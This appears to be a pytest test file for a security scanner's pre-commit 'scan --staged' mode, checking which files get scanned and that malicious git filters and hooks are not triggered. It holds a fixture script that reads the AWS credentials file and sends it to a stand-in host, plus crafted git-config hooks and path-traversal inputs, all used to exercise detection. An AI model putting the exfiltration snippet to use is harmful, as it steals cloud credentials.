"""`scan --staged` (the pre-commit hook): what the next commit would contain, nothing else."""

from __future__ import annotations

import json
import os
import shutil
import subprocess  # nosec B404 - runs git with fixed arguments to build a test repository
from pathlib import Path

import pytest

from skilltotal.cli import _staged_parts, _staged_snapshot, main

pytestmark = pytest.mark.skipif(shutil.which("git") is None, reason="needs git")

# A script that reads a credential file and sends it out: ST-COMBO-EXFIL, critical.
EXFIL = (
    "import os, urllib.request\n"
    "data = open(os.path.expanduser('~/.aws/credentials')).read()\n"
    "urllib.request.urlopen('https://collect.example.invalid', data.encode())\n"
)


def _git(repo: Path, *argv: str) -> None:
    subprocess.run(["git", "-C", str(repo), *argv], check=True, capture_output=True)  # nosec


def _repo(tmp_path: Path) -> Path:
    repo = tmp_path / "project"
    repo.mkdir()
    _git(repo, "init", "-q")
    (repo / "app.py").write_text("print('hello')\n", encoding="utf-8")
    _git(repo, "add", "app.py")
    return repo


def _scan(repo: Path, tmp_path: Path, *extra: str) -> tuple[int, dict]:
    out = tmp_path / "report.json"
    code = main(["scan", str(repo), "--staged", "--json", "--output", str(out), *extra])
    return code, json.loads(out.read_text(encoding="utf-8")) if out.exists() else {}


def test_an_untracked_file_does_not_fail_the_commit(tmp_path):
    repo = _repo(tmp_path)
    (repo / "scratch.py").write_text(EXFIL, encoding="utf-8")  # never added
    code, report = _scan(repo, tmp_path, "--fail-on-high")
    assert code == 0
    assert "scratch.py" not in json.dumps(report)
    # Without --staged the working tree is scanned, the untracked file with it.
    assert main(["scan", str(repo), "--fail-on-high"]) == 2


def test_a_staged_file_is_scanned_as_staged(tmp_path):
    repo = _repo(tmp_path)
    (repo / "upload.py").write_text(EXFIL, encoding="utf-8")
    _git(repo, "add", "upload.py")
    # Edited after staging: the commit still carries the staged version.
    (repo / "upload.py").write_text("print('clean now')\n", encoding="utf-8")
    code, report = _scan(repo, tmp_path, "--fail-on-high")
    assert code == 2
    assert "ST-COMBO-EXFIL" in {f["id"] for f in report["findings"]}
    assert report["component"]["source"] == str(repo)  # not the temporary copy
    assert report["component"]["name"] == "project"


def test_an_ignored_file_is_left_out(tmp_path):
    repo = _repo(tmp_path)
    (repo / ".gitignore").write_text("local/\n", encoding="utf-8")
    _git(repo, "add", ".gitignore")
    (repo / "local").mkdir()
    (repo / "local" / "tool.py").write_text(EXFIL, encoding="utf-8")
    code, _ = _scan(repo, tmp_path, "--fail-on-high")
    assert code == 0


def test_a_subfolder_is_scanned_from_the_index(tmp_path):
    repo = _repo(tmp_path)
    (repo / "pkg").mkdir()
    (repo / "pkg" / "send.py").write_text(EXFIL, encoding="utf-8")
    _git(repo, "add", "pkg/send.py")
    code, report = _scan(repo / "pkg", tmp_path, "--fail-on-high")
    assert code == 2
    assert all(e["file"] == "send.py" for f in report["findings"] for e in f["evidence"])


def test_outside_a_git_repository_it_is_an_error(tmp_path, capsys):
    folder = tmp_path / "plain"
    folder.mkdir()
    (folder / "a.py").write_text("x = 1\n", encoding="utf-8")
    assert main(["scan", str(folder), "--staged"]) == 1
    assert "error: --staged:" in capsys.readouterr().err


def test_a_package_source_is_an_error(capsys):
    assert main(["scan", "npm:left-pad", "--staged"]) == 1
    assert "is not a folder" in capsys.readouterr().err


def test_the_repository_config_runs_no_filter_fsmonitor_or_hook(tmp_path):
    # The repository's own .git/config is not the committer's to trust (a cloned project can come
    # with one set up): a smudge or process filter, an fsmonitor hook or a hooks path in it must
    # not run while the index is written out.
    repo = _repo(tmp_path)
    (repo / ".gitattributes").write_text("* filter=x\n", encoding="utf-8")
    (repo / "upload.py").write_text(EXFIL, encoding="utf-8")
    _git(repo, "add", ".gitattributes", "upload.py")
    marker = tmp_path / "ran"
    script = tmp_path / "filter.sh"
    script.write_text(f"#!/bin/sh\necho ran > '{marker.as_posix()}'\ncat\n", encoding="utf-8")
    script.chmod(0o755)
    hooks = tmp_path / "hooks"
    hooks.mkdir()
    for hook in ("post-checkout", "post-index-change", "reference-transaction"):
        (hooks / hook).write_text(script.read_text(encoding="utf-8"), encoding="utf-8")
        (hooks / hook).chmod(0o755)
    command = f"sh '{script.as_posix()}'"
    for key, value in (("filter.x.smudge", command), ("filter.x.clean", "cat"),
                       ("filter.x.process", command), ("filter.x.required", "true"),
                       ("core.fsmonitor", script.as_posix()),
                       ("core.hooksPath", hooks.as_posix())):
        _git(repo, "config", key, value)
    code, report = _scan(repo, tmp_path, "--fail-on-high")
    assert not marker.exists()
    assert code == 2  # the staged content itself was read
    assert "ST-COMBO-EXFIL" in {f["id"] for f in report["findings"]}


@pytest.mark.skipif(os.name == "nt", reason="a link needs privileges on Windows")
def test_a_staged_link_is_not_written_out(tmp_path):
    repo = _repo(tmp_path)
    (repo / "creds").symlink_to(tmp_path)
    _git(repo, "add", "creds")
    with _staged_snapshot(str(repo)) as copy:
        assert (copy / "app.py").is_file()
        assert not os.path.lexists(copy / "creds")


@pytest.mark.parametrize("path", ["../x", "a/../../x", "/etc/x", "a//b", "./a"])
def test_an_index_path_that_could_leave_the_copy_is_refused(path):
    assert _staged_parts(path) is None
    assert _staged_parts("pkg/mod.py") == ["pkg", "mod.py"]


@pytest.mark.skipif(os.name != "nt", reason="Windows path rules")
@pytest.mark.parametrize("path", ["CON", "a/aux.txt", "a\\..\\..\\x", "c:x", "a/b."])
def test_an_index_path_windows_cannot_hold_is_refused(path):
    assert _staged_parts(path) is None


def test_the_pre_commit_hook_scans_the_index():
    hooks = (Path(__file__).resolve().parents[1] / ".pre-commit-hooks.yaml").read_text(
        encoding="utf-8")
    assert "entry: skilltotal scan --staged" in hooks
